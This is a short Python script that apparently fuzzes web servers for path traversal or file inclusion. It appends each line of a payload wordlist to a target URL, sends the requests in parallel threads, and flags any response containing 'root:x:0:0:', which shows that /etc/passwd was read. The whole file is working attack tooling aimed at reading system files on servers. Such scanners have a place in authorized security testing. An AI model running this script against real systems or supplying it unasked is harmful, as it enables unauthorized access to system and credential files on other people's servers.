import sys
from threading import Thread

import requests


def list_payloads(wordlist):
    with open(wordlist, "r") as file:
        payloads = file.readlines()
        for payload in payloads:
            payload = payload.strip()
            word_list.append(payload)



def get(url, payload):
    word_list.remove(payload) #Control for Threads

    get = requests.get(url + payload)
    if get.status_code == 200:
        html = get.text
        if "root:x:0:0:" in html:
            print(f"\033[35m{get.url} --> {get.status_code}\033[m")
        




if __name__ == "__main__":
    word_list = []
    time_to_sleep = 0
    url = sys.argv[1]

    payloads = list_payloads(sys.argv[2])

    while len(word_list) > 0:
        try:
            Thread(target=get, args=[url, word_list[0]]).start()
            Thread(target=get, args=[url, word_list[1]]).start()
            Thread(target=get, args=[url, word_list[2]]).start()
            Thread(target=get, args=[url, word_list[3]]).start()
            Thread(target=get, args=[url, word_list[4]]).start()
        except:
            pass
            #print("done")
